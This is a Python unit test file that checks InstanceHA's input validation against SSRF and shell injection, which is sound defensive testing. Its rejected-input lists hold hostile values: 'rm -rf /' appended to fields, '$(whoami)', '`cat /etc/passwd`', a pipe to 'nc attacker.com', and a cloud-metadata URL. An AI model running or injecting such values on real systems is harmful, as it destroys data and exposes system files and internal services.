"""
Security validation tests for InstanceHA.

Tests critical security validation paths including:
- SSRF prevention (URL validation, localhost blocking)
- Injection attack prevention (port, action, parameter validation)
- Configuration security (parsing errors, type validation)
"""

import os
import sys
import unittest
import tempfile
import yaml
from unittest.mock import Mock, patch, MagicMock

# Mock OpenStack dependencies
if 'novaclient' not in sys.modules:
    sys.modules['novaclient'] = MagicMock()
    sys.modules['novaclient.client'] = MagicMock()
    class NotFound(Exception):
        pass
    class Conflict(Exception):
        pass
    class Forbidden(Exception):
        pass
    class Unauthorized(Exception):
        pass
    novaclient_exceptions = MagicMock()
    novaclient_exceptions.NotFound = NotFound
    novaclient_exceptions.Conflict = Conflict
    novaclient_exceptions.Forbidden = Forbidden
    novaclient_exceptions.Unauthorized = Unauthorized
    sys.modules['novaclient.exceptions'] = novaclient_exceptions

if 'keystoneauth1' not in sys.modules:
    sys.modules['keystoneauth1'] = MagicMock()
    sys.modules['keystoneauth1.loading'] = MagicMock()
    sys.modules['keystoneauth1.session'] = MagicMock()
    sys.modules['keystoneauth1.exceptions'] = MagicMock()
    sys.modules['keystoneauth1.exceptions.discovery'] = MagicMock()

# Add module path
test_dir = os.path.dirname(os.path.abspath(__file__))
instanceha_path = os.path.join(test_dir, '../../templates/instanceha/bin/')
sys.path.insert(0, os.path.abspath(instanceha_path))

import instanceha


class TestSSRFPrevention(unittest.TestCase):
    """Test SSRF (Server-Side Request Forgery) prevention."""

    def test_url_validation_blocks_localhost(self):
        """Test that URL validation blocks localhost addresses."""
        localhost_urls = [
            'http://localhost/admin',
            'http://localhost:8080/api',
            'https://localhost/secret',
        ]

        for url in localhost_urls:
            with self.subTest(url=url):
                result = instanceha.validate_input(url, 'url', 'SSRF test')
                self.assertFalse(result, f"Should block localhost URL: {url}")

    def test_url_validation_blocks_loopback_ips(self):
        """Test that URL validation blocks common loopback IP addresses."""
        # Only 127.0.0.1 (not entire 127.0.0.0/8) is blocked per implementation
        loopback_urls = [
            'http://127.0.0.1/admin',
            'http://127.0.0.1:8080/api',
            'http://[::1]/metadata',
            'http://0.0.0.0:9000/status',
        ]

        for url in loopback_urls:
            with self.subTest(url=url):
                result = instanceha.validate_input(url, 'url', 'SSRF test')
                self.assertFalse(result, f"Should block loopback URL: {url}")

    def test_url_validation_blocks_link_local(self):
        """Test that URL validation blocks link-local addresses (169.254.x.x)."""
        link_local_urls = [
            'http://169.254.169.254/latest/meta-data',  # AWS metadata
            'http://169.254.0.1/metadata',
            'http://169.254.255.255/api',
        ]

        for url in link_local_urls:
            with self.subTest(url=url):
                result = instanceha.validate_input(url, 'url', 'SSRF test')
                self.assertFalse(result, f"Should block link-local URL: {url}")

    def test_url_validation_allows_valid_urls(self):
        """Test that URL validation allows legitimate URLs."""
        valid_urls = [
            'http://example.com/api',
            'https://192.168.1.100:443/redfish',
            'http://10.0.0.50:8080/status',
            'https://node-1.example.com/metrics',
        ]

        for url in valid_urls:
            with self.subTest(url=url):
                result = instanceha.validate_input(url, 'url', 'test')
                self.assertTrue(result, f"Should allow valid URL: {url}")

    def test_url_validation_rejects_malformed_urls(self):
        """Test that URL validation rejects malformed URLs."""
        malformed_urls = [
            'not-a-url',
            'ftp://example.com',  # Wrong scheme
            'http://',  # No netloc
            '://example.com',  # No scheme
            '',  # Empty
        ]

        for url in malformed_urls:
            with self.subTest(url=url):
                result = instanceha.validate_input(url, 'url', 'test')
                self.assertFalse(result, f"Should reject malformed URL: {url}")

    def test_redfish_url_building_rejects_invalid(self):
        """Test that Redfish URL building rejects invalid configurations."""
        # Test with invalid IP (would be caught by validation)
        invalid_configs = [
            {'ipaddr': 'localhost', 'ipport': '443', 'uuid': 'test'},  # localhost
            {'ipaddr': '127.0.0.1', 'ipport': '443', 'uuid': 'test'},  # loopback
            {'ipaddr': '169.254.169.254', 'ipport': '443', 'uuid': 'test'},  # link-local
        ]

        for config in invalid_configs:
            with self.subTest(config=config):
                url = instanceha._build_redfish_url(config)
                # URL is built, but validation should catch it
                if url:
                    result = instanceha.validate_input(url, 'url', 'Redfish')
                    self.assertFalse(result)


class TestInjectionPrevention(unittest.TestCase):
    """Test prevention of injection attacks."""

    def test_port_validation_rejects_out_of_range(self):
        """Test that port validation rejects out-of-range ports."""
        invalid_ports = ['0', '-1', '65536', '99999', '-8080']

        for port in invalid_ports:
            with self.subTest(port=port):
                result = instanceha.validate_input(port, 'port', 'test')
                self.assertFalse(result, f"Should reject invalid port: {port}")

    def test_port_validation_rejects_non_numeric(self):
        """Test that port validation rejects non-numeric values."""
        invalid_ports = ['abc', '80a', '8080;rm -rf /', '$(whoami)']

        for port in invalid_ports:
            with self.subTest(port=port):
                result = instanceha.validate_input(port, 'port', 'test')
                self.assertFalse(result, f"Should reject non-numeric port: {port}")

    def test_power_action_validation_whitelisting(self):
        """Test that power actions are strictly whitelisted."""
        # Valid actions
        valid_actions = ['on', 'off', 'status', 'ForceOff', 'GracefulShutdown']
        for action in valid_actions:
            with self.subTest(action=action):
                result = instanceha.validate_input(action, 'power_action', 'test')
                self.assertTrue(result, f"Should allow valid action: {action}")

        # Invalid/injection attempts
        invalid_actions = [
            'on; rm -rf /',
            'off && whoami',
            '`cat /etc/passwd`',
            'status | nc attacker.com',
            'reboot',  # Not in whitelist
        ]
        for action in invalid_actions:
            with self.subTest(action=action):
                result = instanceha.validate_input(action, 'power_action', 'test')
                self.assertFalse(result, f"Should reject invalid action: {action}")

    def test_username_validation_rejects_shell_metacharacters(self):
        """Test that username validation rejects shell metacharacters."""
        invalid_usernames = [
            'admin;rm -rf /',
            'user`whoami`',
            'test$(id)',
            'user&ls',
            'admin|cat /etc/passwd',
            'user\'DROP TABLE',
        ]

        for username in invalid_usernames:
            with self.subTest(username=username):
                result = instanceha.validate_input(username, 'username', 'test')
                self.assertFalse(result, f"Should reject malicious username: {username}")

    def test_kubernetes_resource_validation(self):
        """Test that Kubernetes resource names are properly validated."""
        # Valid k8s names
        valid_names = [
            'my-bmh-host',
            'compute-01',
            'node-1.example',
        ]
        for name in valid_names:
            with self.subTest(name=name):
                result = instanceha.validate_input(name, 'k8s_resource', 'test')
                self.assertTrue(result, f"Should allow valid k8s name: {name}")

        # Invalid k8s names (injection attempts)
        invalid_names = [
            '../etc/passwd',
            'host; kubectl delete',
            'node$(whoami)',
            'bmh`ls`',
            'UPPERCASE',  # k8s names must be lowercase
        ]
        for name in invalid_names:
            with self.subTest(name=name):
                result = instanceha.validate_input(name, 'k8s_resource', 'test')
                self.assertFalse(result, f"Should reject invalid k8s name: {name}")

    def test_kubernetes_namespace_validation(self):
        """Test that Kubernetes namespace validation rejects injection attempts."""
        # Valid namespaces
        valid = ['default', 'openshift-machine-api', 'test-namespace']
        for ns in valid:
            result = instanceha.validate_input(ns, 'k8s_namespace', 'test')
            self.assertTrue(result)

        # Invalid/injection attempts
        invalid = ['../etc', 'ns;rm -rf /', '`whoami`', 'NS-CAPS']
        for ns in invalid:
            result = instanceha.validate_input(ns, 'k8s_namespace', 'test')
            self.assertFalse(result)


class TestFencingValidation(unittest.TestCase):
    """Test fencing operation validation."""

    def setUp(self):
        """Set up test fixtures."""
        self.mock_service = Mock()
        self.mock_service.config = Mock()
        self.mock_service.config.fencing = {}
        self.mock_service.config.get_config_value = Mock(return_value=30)

    def test_host_fence_rejects_invalid_action(self):
        """Test that _host_fence rejects invalid power actions."""
        invalid_actions = ['reboot', 'reset', 'shutdown', 'invalid']

        for action in invalid_actions:
            with self.subTest(action=action):
                result = instanceha._host_fence('test-host', action, self.mock_service)
                self.assertFalse(result, f"Should reject invalid action: {action}")

    def test_host_fence_validates_action_at_entry(self):
        """Test that _host_fence validates actions before lookup."""
        # Even with fencing config, invalid action should be rejected early
        self.mock_service.config.fencing = {
            'test-host': {
                'agent': 'fence_ipmilan',
                'ipaddr': '192.168.1.10',
                'ipport': '623',
                'login': 'admin',
                'passwd': 'secret',
            }
        }

        result = instanceha._host_fence('test-host', 'invalid_action', self.mock_service)
        self.assertFalse(result)

    def test_host_fence_requires_host_parameter(self):
        """Test that _host_fence rejects missing host."""
        result = instanceha._host_fence('', 'off', self.mock_service)
        self.assertFalse(result)

        result = instanceha._host_fence(None, 'off', self.mock_service)
        self.assertFalse(result)

    def test_execute_fence_operation_validates_action(self):
        """Test that _execute_fence_operation validates power action."""
        fencing_data = {
            'agent': 'fence_ipmilan',
            'ipaddr': '192.168.1.10',
            'ipport': '623',
            'login': 'admin',
            'passwd': 'secret',
        }

        # Invalid action should be rejected
        result = instanceha._execute_fence_operation(
            'test-host', 'malicious; rm -rf /', fencing_data, self.mock_service
        )
        self.assertFalse(result)


if __name__ == '__main__':
    unittest.main()
